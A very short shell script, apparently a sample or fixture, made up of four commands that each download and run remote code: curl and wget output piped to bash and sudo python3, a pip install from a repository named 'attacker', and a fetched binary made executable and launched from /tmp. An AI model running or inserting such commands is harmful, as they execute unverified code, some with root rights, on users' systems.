#!/bin/sh
curl -fsSL https://example.com/setup.sh | bash
wget -qO- https://example.com/x.py | sudo python3 -
pip install git+https://github.com/attacker/pkg.git
curl -o /tmp/agent https://example.com/agent && chmod +x /tmp/agent && /tmp/agent
